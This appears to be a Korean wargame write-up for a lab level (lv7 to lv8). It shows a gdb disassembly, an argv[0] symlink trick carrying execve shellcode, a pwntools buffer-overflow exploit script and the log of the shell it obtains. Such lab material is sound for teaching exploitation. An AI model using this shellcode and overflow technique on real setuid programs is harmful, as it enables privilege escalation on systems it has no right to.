# Lv7 -> Lv8
## lv8
gdb를 이용해 lv8 바이너리의 추가된 부분을 분석해 보면 다음과 같다.


* main + 6
```asm
   0x08048506 <+6>:	cmp    DWORD PTR [ebp+0x8],0x2
   0x0804850a <+10>:	je     0x8048523 <main+35>
   0x0804850c <+12>:	push   0x8048690
   0x08048511 <+17>:	call   0x8048410 <printf@plt>
   0x08048516 <+22>:	add    esp,0x4
   0x08048519 <+25>:	push   0x0
   0x0804851b <+27>:	call   0x8048420 <exit@plt>		; exit if (argc != 2)
   0x08048520 <+32>:	add    esp,0x4
```

드디어 argv[2]를 사용할 수 없게 막았다.
argv[1]의 길이도 0x30 이하로 제한해 우리가 사용할 수 있는것은 argv[0] 뿐이다.
argv[0]는 심볼릭 링크를 통해 조절할 수 있다.
`ln -s` 옵션을 이용해 아래의 쉘코드를 이름으로 하는 링크를 만든다.

```
"\x90"*20 + "\x66\xb8\xf0\x03\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\xbe\x2e\x2e\x72\x67\x81\xc6\x01\x01\x01\x01\x56\xbf\x2e\x62\x69\x6e\x47\x57\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

쉘코드에 포함되어있는 0x2f는 아스키코드로 보면 `/` 이므로 리눅스에서 경로로 인식한다.
링크를 생성할 때 이름에 `/` 값이 들어가 있으면 안된다. 2f가 없는 쉘코드를 사용해야 한다.

## exploit.py

```python
from pwn import *
import os

context.log_level = 'debug'

argv1 = "a"*0x2c  +  "\xb0\xdf\xff\xff"
fileName = "\x90"*20 + "\x66\xb8\xf0\x03\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\xbe\x2e\x2e\x72\x67\x81\xc6\x01\x01\x01\x01\x56\xbf\x2e\x62\x69\x6e\x47\x57\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

if not os.path.exists(fileName):
    os.system('ln -s lv8 ' + fileName)

p = process(['./' + fileName, argv1])
p.recvuntil('\n')
p.sendline('id')
p.recvuntil('\n')
p.sendline('my-pass')
p.interactive()
```
------

```
lv7@ubuntu:~$ python exploit.py 
[+] Starting local process './\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90f\xb8\xf0\x03\x89\xc3\x89\xc11\xc0\xb0F\xcd\x801\xc0P\xbe..rg\x81\xc6\x01\x01\x01\x01V\xbf.binGW\x89\xe3P\x89\xe2S\x89\xe1\xb0\x0b\xcd\x80' argv=['./\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90f\xb8\xf0\x03\x89\xc3\x89\xc11\xc0\xb0F\xcd\x801\xc0P\xbe..rg\x81\xc6\x01\x01\x01\x01V\xbf.binGW\x89\xe3P\x89\xe2S\x89\xe1\xb0\x0b\xcd\x80', 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb0\xdf\xff\xff'] : pid 43526
[DEBUG] Received 0x31 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000020  61 61 61 61  61 61 61 61  61 61 61 61  b0 df ff ff  │aaaa│aaaa│aaaa│····│
    00000030  0a                                                  │·│
    00000031
[DEBUG] Sent 0x3 bytes:
    'id\n'
[DEBUG] Received 0x2d bytes:
    'uid=1008(lv8) gid=1007(lv7) groups=1007(lv7)\n'
[DEBUG] Sent 0x8 bytes:
    'my-pass\n'
[*] Switching to interactive mode
[DEBUG] Received 0xf bytes:
    'bothering argc\n'
bothering argc
$
```